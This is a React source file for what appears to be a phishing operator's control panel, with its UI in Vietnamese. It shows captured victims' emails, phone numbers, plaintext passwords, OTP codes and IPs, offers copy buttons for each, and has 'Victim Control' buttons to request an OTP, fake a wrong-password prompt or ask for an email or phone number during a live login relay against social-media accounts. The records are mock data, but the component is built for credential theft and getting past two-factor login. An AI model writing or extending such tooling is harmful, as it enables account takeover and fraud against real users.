
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from '@/components/ui/use-toast';
import { ExternalLink, Copy, Check, MessageSquare, Mail, Phone, X, Power, UserPlus, Settings, Play } from 'lucide-react';
import { v4 as uuidv4 } from 'uuid';

const initialMockData = [
  {
    id: 1,
    timestamp: new Date('2025-09-09T17:13:51'),
    linkName: 'Admin Huy',
    account_email: 'user.prod@example.com',
    account_phone: '+84901234567',
    account_type: 'Verified Account',
    password: 'MyPassword123!',
    otp: '123456',
    ip: '192.168.1.100',
    status: 'pending',
    chromeProfile: 'facebook-profile-1',
    isTest: false,
  },
  {
    id: 2,
    timestamp: new Date('2025-09-09T17:08:51'),
    linkName: 'Admin Tuan',
    account_email: 'testuser@gmail.com',
    account_phone: '+84987654321',
    account_type: 'Business Account',
    password: 'SecurePass456',
    otp: '789012',
    ip: '10.0.0.50',
    status: 'success',
    chromeProfile: 'google-profile-2',
    isTest: false,
  },
  {
    id: 3,
    timestamp: new Date(),
    linkName: 'Test Admin',
    account_email: 'sandbox.user@victim.dev',
    account_phone: '+1-555-0100',
    account_type: 'Sandbox Account',
    password: 'SandboxPassword!',
    otp: '999888',
    ip: '127.0.0.1',
    status: 'test',
    chromeProfile: 'sandbox-profile-0',
    isTest: true,
  },
  {
    id: 4,
    timestamp: new Date('2025-09-09T17:03:51'),
    linkName: 'Admin Huy',
    account_email: 'insta@example.com',
    account_phone: '+84912345678',
    account_type: 'Personal Account',
    password: 'InstaPass789',
    otp: '345678',
    ip: '172.16.0.1',
    status: 'failed',
    chromeProfile: 'instagram-profile-3',
    isTest: false,
  },
  {
    id: 5,
    timestamp: new Date('2025-09-09T16:55:21'),
    linkName: 'Admin Tuan',
    account_email: 'tiktok.user@example.com',
    account_phone: '+84911223344',
    account_type: 'Creator Account',
    password: 'TikTokSecure!',
    otp: '998877',
    ip: '192.168.1.101',
    status: 'otp',
    chromeProfile: 'tiktok-profile-4',
    isTest: false,
  },
];

const ActionButton = ({ variant, icon: Icon, children, onClick }) => {
    const variants = {
        approve: "bg-green-500/10 border-green-500/50 text-green-400 hover:bg-green-500/20",
        otp: "bg-orange-500/10 border-orange-500/50 text-orange-400 hover:bg-orange-500/20",
        email: "bg-purple-500/10 border-purple-500/50 text-purple-400 hover:bg-purple-500/20",
        phone: "bg-sky-500/10 border-sky-500/50 text-sky-400 hover:bg-sky-500/20",
        password: "bg-yellow-500/10 border-yellow-500/50 text-yellow-400 hover:bg-yellow-500/20",
        login_ok: "bg-blue-500/10 border-blue-500/50 text-blue-400 hover:bg-blue-500/20",
    };

    return (
        <Button onClick={onClick} variant="outline" size="sm" className={`h-8 w-full flex items-center justify-center text-xs rounded-md border ${variants[variant]}`}>
            <Icon className="h-4 w-4 mr-1.5" />
            {children}
        </Button>
    );
};

const StatusBadge = ({ status }) => {
    const statusConfig = {
        pending: { variant: 'warning', text: 'Chờ duyệt' },
        success: { variant: 'success', text: 'Thành công' },
        failed: { variant: 'destructive', text: 'Thất bại' },
        otp: { variant: 'info', text: 'Cần OTP' },
        test: { variant: 'test', text: '[TEST]' },
        processing: { variant: 'info', text: 'Đang xử lý'},
        require_email: { variant: 'info', text: 'Cần Email'},
        require_phone: { variant: 'info', text: 'Cần SĐT'},
    };

    const config = statusConfig[status] || { variant: 'secondary', text: 'Không rõ' };

    return <Badge variant={config.variant}>{config.text}</Badge>;
};

const AccessHistoryTable = ({ searchTerm }) => {
  const { toast } = useToast();
  const [filter, setFilter] = useState('all');
  const [data, setData] = useState(initialMockData);
  
  const handleNotImplemented = (feature) => {
    toast({
      title: `🚧 Tính năng "${feature}" chưa được triển khai`,
      description: 'Chức năng này sẽ sớm được bổ sung. 🚀'
    });
  };
  
  const handleCopy = (text, fieldName) => {
    navigator.clipboard.writeText(text);
    toast({
      title: 'Đã sao chép!',
      description: `${fieldName} đã được sao chép vào clipboard.`,
    });
  };
  
  const updateItemStatus = (itemId, newStatus, updates = {}) => {
      setData(prevData => prevData.map(item => 
          item.id === itemId ? { ...item, status: newStatus, ...updates } : item
      ));
  };

  const handleAddTestUser = () => {
      const newId = uuidv4();
      const newTestUser = {
        id: newId,
        timestamp: new Date(),
        linkName: 'Sandbox',
        account_email: `victim_${Math.floor(Math.random() * 1000)}@sandbox.dev`,
        account_phone: `+1-555-${String(Math.floor(Math.random() * 900) + 100).padStart(3, '0')}-${String(Math.floor(Math.random() * 9000) + 1000).padStart(4, '0')}`,
        account_type: 'Sandbox Account',
        password: `pass_${Math.random().toString(36).slice(-8)}`,
        otp: '',
        ip: '127.0.0.1',
        status: 'pending',
        chromeProfile: 'sandbox-auto-profile',
        isTest: true,
      };

      setData(prevData => [newTestUser, ...prevData]);

      toast({
          title: 'Tạo User Test thành công!',
          description: `User #${newTestUser.id.substring(0, 8)} đã được thêm. Bắt đầu luồng auto.`,
      });

      // Simulate auto-login flow
      setTimeout(() => {
          updateItemStatus(newId, 'processing');
          toast({ title: 'Sandbox Update', description: `User #${newId.substring(0, 8)} đang được xử lý...` });
      }, 5000);

      setTimeout(() => {
          const demoOtp = String(Math.floor(100000 + Math.random() * 900000));
          updateItemStatus(newId, 'otp', { otp: demoOtp });
          toast({ title: 'Sandbox Update', description: `User #${newId.substring(0, 8)} yêu cầu OTP.`, variant: 'info' });
      }, 10000);
  };
  
  const handleVictimControl = (victimId, action) => {
    let newStatus = '';
    let toastTitle = '';

    switch(action) {
        case 'approve': newStatus = 'success'; toastTitle = "Lệnh 'Duyệt' đã được gửi!"; break;
        case 'otp': newStatus = 'otp'; toastTitle = "Lệnh 'Yêu cầu OTP' đã được gửi!"; break;
        case 'password': newStatus = 'failed'; toastTitle = "Lệnh 'Sai Mật Khẩu' đã được gửi!"; break;
        case 'login_ok': newStatus = 'success'; toastTitle = "Lệnh 'Login OK' đã được gửi!"; break;
        case 'require_email': newStatus = 'require_email'; toastTitle = "Lệnh 'Yêu cầu Email' đã được gửi!"; break;
        case 'require_phone': newStatus = 'require_phone'; toastTitle = "Lệnh 'Yêu cầu SĐT' đã được gửi!"; break;
        default: handleNotImplemented(`Hành động ${action}`); return;
    }

    updateItemStatus(victimId, newStatus);

    toast({
        title: toastTitle,
        description: `Trạng thái của Victim #${typeof victimId === 'string' ? victimId.substring(0, 8) : victimId} đã được cập nhật.`
    });
  };

  const filteredData = React.useMemo(() => {
    let filtered = data;
    if (filter === 'prod') {
      filtered = filtered.filter(item => !item.isTest);
    } else if (filter === 'test') {
      filtered = filtered.filter(item => item.isTest);
    }

    return filtered.filter(item => 
        item.linkName.toLowerCase().includes(searchTerm.toLowerCase()) ||
        item.account_email.toLowerCase().includes(searchTerm.toLowerCase()) ||
        item.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
        item.chromeProfile.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [data, filter, searchTerm]);

  return (
    <>
      <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-2">
            <Button onClick={handleAddTestUser} variant="outline" size="sm" className="h-9">
              <UserPlus className="mr-2 h-4 w-4" /> Thêm User Test
            </Button>
          </div>
          <div className="flex items-center gap-2">
              <span className="text-sm text-muted-foreground">Bộ lọc:</span>
              <Select value={filter} onValueChange={setFilter}>
                  <SelectTrigger className="h-9 w-[120px] text-xs bg-input focus:bg-background">
                      <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                      <SelectItem value="all">Tất cả</SelectItem>
                      <SelectItem value="prod">Prod</SelectItem>
                      <SelectItem value="test">Test</SelectItem>
                  </SelectContent>
              </Select>
          </div>
      </div>
      <div className="overflow-x-auto custom-scrollbar border rounded-lg border-border">
          <Table>
            <TableHeader>
              <TableRow className="border-border hover:bg-transparent">
                <TableHead className="w-[50px]">STT</TableHead>
                <TableHead className="min-w-[120px]">Thời Gian</TableHead>
                <TableHead className="min-w-[120px]">Tên Link</TableHead>
                <TableHead className="min-w-[250px]">Tài Khoản</TableHead>
                <TableHead className="min-w-[150px]">Mật Khẩu</TableHead>
                <TableHead className="min-w-[120px]">Code OTP</TableHead>
                <TableHead className="min-w-[120px]">IP Login</TableHead>
                <TableHead className="min-w-[100px]">Trạng Thái</TableHead>
                <TableHead className="min-w-[200px]">Chrome</TableHead>
                <TableHead className="min-w-[200px]">Thông Báo</TableHead>
                <TableHead className="min-w-[240px]">Hành Động (Victim Control)</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredData.map((item, index) => (
                <motion.tr
                  key={item.id}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ duration: 0.5, delay: index * 0.05 }}
                  className="border-border hover:bg-muted/20"
                >
                  <TableCell className="font-medium text-muted-foreground">#{typeof item.id === 'string' ? item.id.substring(0,8) : item.id}</TableCell>
                  <TableCell className="text-xs text-muted-foreground">
                      <div>{item.timestamp.toLocaleTimeString('vi-VN')}</div>
                      <div>{item.timestamp.toLocaleDateString('vi-VN')}</div>
                  </TableCell>
                  <TableCell className="font-semibold text-foreground">{item.linkName}</TableCell>
                  <TableCell>
                      <div className="text-sm font-mono text-foreground">{item.account_email}</div>
                      <div className="text-xs text-muted-foreground">{item.account_phone}</div>
                      {item.isTest && <Badge variant="test" className="mt-1">Sandbox Account</Badge>}
                  </TableCell>
                  <TableCell>
                      <div className="flex items-center gap-2 font-mono">
                          <span>{item.password}</span>
                          <Copy className="h-3.5 w-3.5 text-muted-foreground hover:text-foreground cursor-pointer" onClick={() => handleCopy(item.password, 'Mật khẩu')}/>
                      </div>
                  </TableCell>
                   <TableCell>
                      <div className="flex items-center gap-2 font-mono font-bold text-yellow-400">
                          <span>{item.otp}</span>
                          {item.otp && <Copy className="h-3.5 w-3.5 text-muted-foreground hover:text-yellow-400 cursor-pointer" onClick={() => handleCopy(item.otp, 'OTP')}/>}
                      </div>
                  </TableCell>
                  <TableCell>
                       <div className="flex items-center gap-2 font-mono">
                          <span>{item.ip}</span>
                          <Copy className="h-3.5 w-3.5 text-muted-foreground hover:text-foreground cursor-pointer" onClick={() => handleCopy(item.ip, 'IP')}/>
                      </div>
                  </TableCell>
                  <TableCell>
                      <StatusBadge status={item.status} />
                  </TableCell>
                   <TableCell>
                      <div className="flex flex-col gap-1.5">
                        <span className="font-mono text-sm">{item.chromeProfile}</span>
                        <div className="flex items-center gap-1.5">
                          <Button onClick={() => handleNotImplemented('Open Profile')} variant="outline" size="sm" className="h-7 text-xs px-2"><Play className="h-3 w-3 mr-1"/> Open</Button>
                          <Button onClick={() => handleNotImplemented('Config Profile')} variant="ghost" size="icon" className="h-7 w-7"><Settings className="h-4 w-4"/></Button>
                        </div>
                      </div>
                  </TableCell>
                  <TableCell>
                      <div className="flex items-center gap-2">
                          <Select onValueChange={() => handleNotImplemented('Chọn mẫu thông báo')}>
                              <SelectTrigger className="h-7 w-[120px] text-xs bg-input focus:bg-background">
                                  <SelectValue placeholder="Chọn mẫu..." />
                              </SelectTrigger>
                              <SelectContent>
                                  <SelectItem value="m1">Mẫu 1: Chung</SelectItem>
                                  <SelectItem value="m2">Mẫu 2: Cảnh báo</SelectItem>
                              </SelectContent>
                          </Select>
                          <Button onClick={() => handleNotImplemented('Gửi thông báo')} variant="outline" size="sm" className="h-7 px-2.5 text-xs"><Checkbox className="mr-1.5 h-3.5 w-3.5"/> Gửi</Button>
                      </div>
                  </TableCell>
                  <TableCell>
                    <div className="flex flex-col gap-1.5 w-full max-w-[220px]">
                      <div className="grid grid-cols-3 gap-1.5">
                        <ActionButton variant="approve" icon={Check} onClick={() => handleVictimControl(item.id, 'approve')}>Duyệt</ActionButton>
                        <ActionButton variant="otp" icon={MessageSquare} onClick={() => handleVictimControl(item.id, 'otp')}>OTP</ActionButton>
                        <ActionButton variant="password" icon={X} onClick={() => handleVictimControl(item.id, 'password')}>Sai MK</ActionButton>
                      </div>
                      <div className="grid grid-cols-3 gap-1.5">
                         <ActionButton variant="email" icon={Mail} onClick={() => handleVictimControl(item.id, 'require_email')}>Email</ActionButton>
                         <ActionButton variant="phone" icon={Phone} onClick={() => handleVictimControl(item.id, 'require_phone')}>SĐT</ActionButton>
                         <ActionButton variant="login_ok" icon={Power} onClick={() => handleVictimControl(item.id, 'login_ok')}>Login OK</ActionButton>
                      </div>
                    </div>
                  </TableCell>
                </motion.tr>
              ))}
            </TableBody>
          </Table>
        </div>
    </>
  );
};

export default AccessHistoryTable;
